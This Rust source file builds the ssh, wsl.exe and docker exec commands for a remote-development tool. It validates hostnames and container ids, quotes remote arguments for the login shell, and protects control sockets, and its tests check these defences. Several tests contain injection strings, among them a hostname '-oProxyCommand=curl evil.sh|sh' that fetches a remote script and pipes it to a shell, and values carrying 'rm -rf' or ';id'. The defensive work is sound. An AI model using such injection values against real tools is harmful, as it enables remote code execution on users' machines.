//! Building the command that runs a program on the remote for an authority.
//!
//! Every command is built as an argument vector and passed to the OS directly.
//! A hostname or container id can come from an untrusted source such as a
//! `deco-remote://` link or a `.code-workspace` file, so it is never placed in a
//! shell string. With `ssh "$host" "$cmd"`, a host of `x; rm -rf ~` would allow
//! remote code execution.
//!
//! The remote command is a different case for SSH. OpenSSH joins the arguments
//! after the host with spaces and the remote login shell parses the result, so
//! each remote argument is POSIX single-quoted before it is passed to `ssh`.
//! This requires a POSIX-compatible login shell on the remote (`sh`, `bash`,
//! `dash`, `zsh`, `ksh`); `csh`, `tcsh` and `fish` are not supported.

use std::path::{Path, PathBuf};

use crate::authority::Authority;

/// A command to run, as a program and its arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Command {
    /// The program to execute.
    pub program: String,
    /// Its arguments, one element per argument, passed to the local OS without
    /// a shell. For SSH, the remote arguments among them are already quoted
    /// for the remote login shell.
    pub args: Vec<String>,
}

impl Command {
    fn new(program: &str, args: Vec<String>) -> Self {
        Self {
            program: program.to_owned(),
            args,
        }
    }
}

/// Failure to build a transport command.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum TransportError {
    /// The authority is local, so there is nothing to connect to.
    #[error("the local machine needs no transport")]
    Local,
    /// A hostname or container id contained characters that are not valid in it.
    ///
    /// Rejected rather than escaped. No legitimate hostname or container id
    /// contains a newline or a NUL, and accepting one would rely on every
    /// downstream tool to quote it correctly.
    #[error("`{value}` is not a valid {field}")]
    InvalidTarget {
        /// What was being validated.
        field: &'static str,
        /// The offending value.
        value: String,
    },
}

/// Rejects targets that cannot legitimately appear in a hostname or id.
fn validate(field: &'static str, value: &str) -> Result<(), TransportError> {
    let bad = value.is_empty()
        || value.starts_with('-')
        || value
            .chars()
            .any(|c| c.is_control() || c == '\0' || c.is_whitespace());
    if bad {
        return Err(TransportError::InvalidTarget {
            field,
            value: value.to_owned(),
        });
    }
    Ok(())
}

/// How deco reaches a remote.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TransportOptions {
    /// Seconds before an SSH connection attempt is abandoned.
    pub connect_timeout_secs: u32,
    /// Where SSH keeps its control socket, or `None` for no multiplexing.
    ///
    /// With multiplexing, each additional channel reuses the existing
    /// connection instead of performing another authentication round-trip. This
    /// matters most for [`forward`](crate::forward): a browser opening one page
    /// can make twenty connections, and twenty SSH handshakes would be too slow.
    ///
    /// It is a path rather than a flag because `ControlMaster` alone has no
    /// effect: OpenSSH's `ControlPath` has no default, and without one the
    /// setting is ignored. The type therefore cannot express multiplexing
    /// without a path.
    pub control_path: Option<PathBuf>,
}

impl Default for TransportOptions {
    /// No multiplexing, because choosing a socket location touches the
    /// filesystem, and `Default` should not create directories.
    /// [`TransportOptions::multiplexed`] enables it.
    fn default() -> Self {
        Self {
            connect_timeout_secs: 20,
            control_path: None,
        }
    }
}

impl TransportOptions {
    /// The default, plus a control socket in a directory only this account can
    /// use.
    ///
    /// Falls back to no multiplexing rather than to a less secure location. A
    /// control socket is a live, authenticated connection to the remote, so a
    /// directory writable by another local user would give that user the
    /// session. The only candidates are therefore the account's runtime
    /// directory and its `~/.ssh`, never the shared temporary directory.
    pub fn multiplexed() -> Self {
        Self {
            control_path: control_directory().ok(),
            ..Self::default()
        }
    }
}

/// A private directory for SSH control sockets, created if it does not exist.
///
/// Returns an error rather than a fallback when the account has no private
/// directory, or when the directory is accessible to other users.
fn control_directory() -> Result<PathBuf, std::io::Error> {
    // Windows' `ssh.exe` does not support `ControlMaster`; reject multiplexing
    // before constructing a command with unsupported options.
    if cfg!(windows) {
        return Err(std::io::Error::other(
            "connection multiplexing is not available on this platform",
        ));
    }
    // `XDG_RUNTIME_DIR` is per-user and 0700 by definition; `~/.ssh` is the
    // other conventional location for control sockets. Neither is shared.
    let base = std::env::var_os("XDG_RUNTIME_DIR")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|home| PathBuf::from(home).join(".ssh")))
        .ok_or_else(|| std::io::Error::other("no private directory to keep a control socket in"))?;
    private_directory(&base.join("deco"))
}

/// Creates `directory` if it does not exist, and ensures only this account can
/// access it.
///
/// Separate from the lookup above so that tests can pass their own directory
/// instead of setting environment variables shared by every test in the
/// process.
fn private_directory(directory: &Path) -> Result<PathBuf, std::io::Error> {
    let directory = directory.to_path_buf();
    std::fs::create_dir_all(&directory)?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        // The directory may already exist, so its privacy is checked rather
        // than assumed.
        //
        // A symlink is rejected, because following it would place the socket
        // at an uncontrolled location.
        if std::fs::symlink_metadata(&directory)?
            .file_type()
            .is_symlink()
        {
            return Err(std::io::Error::other(format!(
                "{} is a symbolic link, and a control socket has to be somewhere                  this account controls",
                directory.display()
            )));
        }
        // This also checks ownership, so it runs unconditionally rather than
        // only when the mode is wrong. `chmod` succeeds only for the owner, so a
        // directory owned by another user fails here instead of being used.
        std::fs::set_permissions(&directory, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(directory)
}

/// Builds the command that runs `remote_command` on `authority`.
///
/// `remote_command` is a program and its arguments. Containers receive it as an
/// exact argument vector. SSH passes it to the remote login shell as one string,
/// so each element is single-quoted with `posix_quote` and the shell recovers
/// the original arguments. WSL passes it unquoted; see the comment in that
/// branch.
pub fn command_for(
    authority: &Authority,
    remote_command: &[String],
    options: &TransportOptions,
) -> Result<Command, TransportError> {
    match authority {
        Authority::Local => Err(TransportError::Local),

        Authority::Ssh { host, port } => {
            validate("hostname", host)?;
            let mut args = vec![
                "-o".to_owned(),
                format!("ConnectTimeout={}", options.connect_timeout_secs),
                // Batch mode: fail instead of blocking on a password prompt
                // that deco cannot display.
                "-o".to_owned(),
                "BatchMode=yes".to_owned(),
            ];
            if let Some(control_path) = &options.control_path {
                args.extend([
                    "-o".to_owned(),
                    "ControlMaster=auto".to_owned(),
                    "-o".to_owned(),
                    "ControlPersist=600".to_owned(),
                    "-o".to_owned(),
                    // `%C` is a hash of the connection parameters. Socket paths
                    // are limited to about 104 bytes, and a long hostname under
                    // a long home directory can exceed that limit.
                    format!("ControlPath={}/%C", control_path.display()),
                ]);
            }
            if let Some(port) = port {
                args.push("-p".to_owned());
                args.push(port.to_string());
            }
            // `--` stops a hostname beginning with `-` being read as a flag.
            args.push("--".to_owned());
            args.push(host.clone());
            // OpenSSH joins these with spaces into one string that the remote
            // login shell parses. Quoting each one keeps spaces, `;`, `$(...)`
            // and backticks inside the argument instead of being interpreted.
            args.extend(remote_command.iter().map(|arg| posix_quote(arg)));
            Ok(Command::new("ssh", args))
        }

        // Known limitation: `wsl.exe -- argv` also runs the command through the
        // distribution's default Linux shell, so an argument containing spaces
        // or shell metacharacters may be split or interpreted there as with
        // unquoted SSH. It is left unquoted until the behaviour of `wsl.exe` is
        // verified on a real machine.
        Authority::Wsl { distro } => {
            let mut args = Vec::new();
            if let Some(distro) = distro {
                validate("distribution name", distro)?;
                args.push("-d".to_owned());
                args.push(distro.clone());
            }
            args.push("--".to_owned());
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("wsl.exe", args))
        }

        Authority::DevContainer { id } | Authority::AttachedContainer { id } => {
            validate("container id", id)?;
            let mut args = vec![
                "exec".to_owned(),
                // `-i` so stdin reaches the server. No TTY, because the protocol
                // is a framed byte stream rather than a terminal session.
                "-i".to_owned(),
                id.clone(),
            ];
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("docker", args))
        }
    }
}

/// Quotes `arg` for a POSIX shell so that it is read back as exactly one word.
///
/// The argument is enclosed in single quotes, inside which a POSIX shell treats
/// every character literally. A single quote in the argument ends the quoted
/// part, is emitted as `\'`, and starts a new quoted part.
fn posix_quote(arg: &str) -> String {
    format!("'{}'", arg.replace('\'', "'\\''"))
}

/// The command that starts deco's headless server on the remote.
///
/// The server uses the framed protocol over its stdin and stdout, so the
/// transport command above is the only connection needed between client and
/// server.
pub fn server_command(server_path: &str, workspace: Option<&str>) -> Vec<String> {
    let mut args = vec![
        server_path.to_owned(),
        "--server".to_owned(),
        "--stdio".to_owned(),
    ];
    if let Some(workspace) = workspace {
        args.push("--workspace".to_owned());
        args.push(workspace.to_owned());
    }
    args
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ssh(authority: &str) -> Command {
        command_for(
            &Authority::parse(authority).unwrap(),
            &["deco".to_owned(), "--server".to_owned()],
            &TransportOptions::default(),
        )
        .unwrap()
    }

    #[test]
    fn without_a_control_path_no_multiplexing_is_claimed() {
        // `ControlMaster=auto` alone has no effect: OpenSSH's `ControlPath` has
        // no default, and without one the setting is ignored. An earlier version
        // emitted it anyway, implying multiplexing that did not happen.
        let command = ssh("ssh-remote+myhost");
        assert!(
            !command
                .args
                .iter()
                .any(|arg| arg.starts_with("ControlMaster")),
            "{:?}",
            command.args
        );
    }

    #[test]
    fn a_control_path_brings_the_whole_multiplexing_set_with_it() {
        let options = TransportOptions {
            control_path: Some(PathBuf::from("/run/user/1000/deco")),
            ..TransportOptions::default()
        };
        let command = command_for(
            &Authority::parse("ssh-remote+myhost").unwrap(),
            &["deco".to_owned()],
            &options,
        )
        .unwrap();
        assert!(command.args.contains(&"ControlMaster=auto".to_owned()));
        assert!(command.args.contains(&"ControlPersist=600".to_owned()));
        // `%C` rather than the connection parameters: socket paths are limited
        // to about 104 bytes, which a long hostname can exceed.
        assert!(command
            .args
            .contains(&"ControlPath=/run/user/1000/deco/%C".to_owned()));
    }

    #[cfg(unix)]
    #[test]
    fn a_control_socket_directory_is_this_account_alone() {
        use std::os::unix::fs::PermissionsExt;

        let directory = std::env::temp_dir().join(format!(
            "deco-control-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&directory);

        let made = private_directory(&directory).expect("a directory");
        let mode = std::fs::metadata(&made)
            .expect("metadata")
            .permissions()
            .mode();
        // A control socket is a live authenticated connection to the remote, so
        // a directory accessible to other users would give them the session.
        assert_eq!(mode & 0o777, 0o700, "{mode:o}");

        // An existing directory with loose permissions is tightened before use.
        std::fs::set_permissions(&made, std::fs::Permissions::from_mode(0o755)).expect("loosened");
        private_directory(&directory).expect("a directory");
        assert_eq!(
            std::fs::metadata(&made)
                .expect("metadata")
                .permissions()
                .mode()
                & 0o777,
            0o700
        );

        let _ = std::fs::remove_dir_all(&directory);
    }

    #[cfg(unix)]
    #[test]
    fn a_control_socket_directory_that_is_a_symlink_is_refused() {
        // Following a symlink would place the socket at an uncontrolled
        // location.
        let base = std::env::temp_dir().join(format!(
            "deco-control-link-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join("elsewhere")).expect("a directory");
        let link = base.join("deco");
        std::os::unix::fs::symlink(base.join("elsewhere"), &link).expect("a symlink");

        let error = private_directory(&link).expect_err("a refusal");
        assert!(error.to_string().contains("symbolic link"), "{error}");

        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn a_local_authority_has_no_transport() {
        assert_eq!(
            command_for(&Authority::Local, &[], &TransportOptions::default()),
            Err(TransportError::Local)
        );
    }

    #[test]
    fn ssh_runs_the_command_on_the_host() {
        let command = ssh("ssh-remote+myhost");
        assert_eq!(command.program, "ssh");
        assert!(command.args.contains(&"myhost".to_owned()));
        // The remote command follows the host, one quoted argument per element.
        let tail = &command.args[command.args.len() - 2..];
        assert_eq!(tail, ["'deco'", "'--server'"]);
    }

    /// The arguments after the host, which OpenSSH joins with spaces into the
    /// string the remote login shell parses.
    fn ssh_remote_string(remote_command: &[&str]) -> String {
        let remote_command: Vec<String> = remote_command.iter().map(|s| (*s).to_owned()).collect();
        let command = command_for(
            &Authority::parse("ssh-remote+myhost").unwrap(),
            &remote_command,
            &TransportOptions::default(),
        )
        .unwrap();
        let host = command.args.iter().position(|a| a == "myhost").unwrap();
        command.args[host + 1..].join(" ")
    }

    #[test]
    fn ssh_quotes_remote_arguments_for_the_login_shell() {
        let joined =
            ssh_remote_string(&["deco", "--workspace", "/home/u/my project; touch x", "it's"]);
        assert_eq!(
            joined,
            r"'deco' '--workspace' '/home/u/my project; touch x' 'it'\''s'"
        );
    }

    #[cfg(unix)]
    #[test]
    fn ssh_remote_arguments_survive_a_posix_shell_unchanged() {
        // Runs the joined string through a local `/bin/sh -c`, which is what
        // the remote login shell does with it, and checks that each argument
        // arrives as it was given.
        let inputs = [
            "/home/u/my project",
            "$(echo x)",
            "`echo x`",
            "it's",
            ";id",
            "",
            "a  b\tc",
            "$HOME",
        ];
        let mut remote_command = vec!["printf", "%s\\n"];
        remote_command.extend(inputs);
        let script = ssh_remote_string(&remote_command);
        let output = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&script)
            .output()
            .expect("/bin/sh runs");
        assert!(output.status.success(), "{output:?}");
        let stdout = String::from_utf8(output.stdout).expect("UTF-8");
        let lines: Vec<&str> = stdout.lines().collect();
        assert_eq!(lines, inputs, "{script}");
    }

    #[test]
    fn ssh_sets_a_connect_timeout_and_refuses_to_block_on_a_password() {
        let command = ssh("ssh-remote+myhost");
        assert!(command.args.contains(&"ConnectTimeout=20".to_owned()));
        assert!(command.args.contains(&"BatchMode=yes".to_owned()));
    }

    #[test]
    fn ssh_passes_a_port_through() {
        let command = ssh("ssh-remote+myhost:2222");
        let position = command.args.iter().position(|a| a == "-p").unwrap();
        assert_eq!(command.args[position + 1], "2222");
    }

    #[test]
    fn a_hostname_is_separated_from_the_options_by_a_double_dash() {
        // Without `--`, a host named `-oProxyCommand=...` would be parsed as an
        // ssh option, a known way to turn a URL into command execution.
        let command = ssh("ssh-remote+myhost");
        let dashes = command.args.iter().position(|a| a == "--").unwrap();
        assert_eq!(command.args[dashes + 1], "myhost");
    }

    #[test]
    fn a_hostname_that_looks_like_a_flag_is_rejected_outright() {
        let authority = Authority::Ssh {
            host: "-oProxyCommand=curl evil.sh|sh".into(),
            port: None,
        };
        assert!(matches!(
            command_for(&authority, &[], &TransportOptions::default()),
            Err(TransportError::InvalidTarget {
                field: "hostname",
                ..
            })
        ));
    }

    #[test]
    fn a_hostname_containing_shell_metacharacters_stays_one_argument() {
        // The value is never concatenated into a shell string. This test checks
        // that it is passed as a single argument.
        let authority = Authority::Ssh {
            host: "user@host;rm".into(),
            port: None,
        };
        let command = command_for(&authority, &[], &TransportOptions::default()).unwrap();
        assert!(command.args.contains(&"user@host;rm".to_owned()));
    }

    #[test]
    fn a_hostname_with_whitespace_or_control_characters_is_rejected() {
        for host in ["my host", "host\nrm -rf", "host\0", ""] {
            let authority = Authority::Ssh {
                host: host.into(),
                port: None,
            };
            assert!(
                command_for(&authority, &[], &TransportOptions::default()).is_err(),
                "{host:?} should be rejected"
            );
        }
    }

    #[test]
    fn wsl_uses_the_default_distribution_when_none_is_named() {
        let command = command_for(
            &Authority::parse("wsl").unwrap(),
            &["deco".to_owned()],
            &TransportOptions::default(),
        )
        .unwrap();
        assert_eq!(command.program, "wsl.exe");
        assert!(!command.args.contains(&"-d".to_owned()));
        assert_eq!(command.args, ["--", "deco"]);
    }

    #[test]
    fn wsl_selects_a_named_distribution() {
        let command = command_for(
            &Authority::parse("wsl+Ubuntu-22.04").unwrap(),
            &["deco".to_owned()],
            &TransportOptions::default(),
        )
        .unwrap();
        assert_eq!(command.args, ["-d", "Ubuntu-22.04", "--", "deco"]);
    }

    #[test]
    fn containers_are_reached_with_docker_exec() {
        for authority in ["dev-container+abc123", "attached-container+abc123"] {
            let command = command_for(
                &Authority::parse(authority).unwrap(),
                &["deco".to_owned(), "--server".to_owned()],
                &TransportOptions::default(),
            )
            .unwrap();
            assert_eq!(command.program, "docker");
            assert_eq!(command.args, ["exec", "-i", "abc123", "deco", "--server"]);
        }
    }

    #[test]
    fn a_container_id_that_looks_like_a_flag_is_rejected() {
        let authority = Authority::DevContainer {
            id: "--privileged".into(),
        };
        assert!(matches!(
            command_for(&authority, &[], &TransportOptions::default()),
            Err(TransportError::InvalidTarget {
                field: "container id",
                ..
            })
        ));
    }

    #[test]
    fn the_server_command_speaks_over_stdio() {
        assert_eq!(
            server_command("deco", None),
            ["deco", "--server", "--stdio"]
        );
        assert_eq!(
            server_command("/usr/local/bin/deco", Some("/home/u/project")),
            [
                "/usr/local/bin/deco",
                "--server",
                "--stdio",
                "--workspace",
                "/home/u/project"
            ]
        );
    }

    #[test]
    fn a_workspace_path_with_spaces_stays_one_argument() {
        let args = server_command("deco", Some("/home/u/my project"));
        assert_eq!(args.last().unwrap(), "/home/u/my project");
    }
}
